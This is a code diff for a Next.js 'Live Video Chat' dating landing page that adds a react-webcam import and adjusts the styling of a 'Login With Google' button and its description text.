@@ -3,6 +3,7 @@ import Head from "next/head";
 import Image from "next/image";
 import { API_URL, site } from "../../../config/index";
 import useMockLogin from "../../../hooks/useMockLogin";
+import Webcam from "react-webcam";
 
 const UserIcon = () => {
   return (
@@ -83,14 +84,14 @@ export default function Home() {
               <h2 class="text-3xl font-bold text-[#2b044d] text-center">
                 Live Video Chat
               </h2>
-              <p class="text-xl pt-5 font-semibold text-[#707b8e]">
+              <p class="text-lg  pt-5 px-5 font-medium">
                 Login With Google and enjoy with{" "}
                 <b class="text-[#2b044d]">Private Live Video Chat</b> your
                 dating partner.
               </p>
 
               <button
-                class="flex items-center justify-center gap-5 p-2 my-5 w-full bg-[#009aff] text-xl font-semibold text-white rounded-md"
+                class="flex items-center justify-center gap-5 p-2 ml-4 my-4 w-[90%] bg-[#009aff] text-xl font-medium  text-white rounded-md"
                 onClick={() => setShowForm(false)}
               >
                 <span>Login With Google</span>
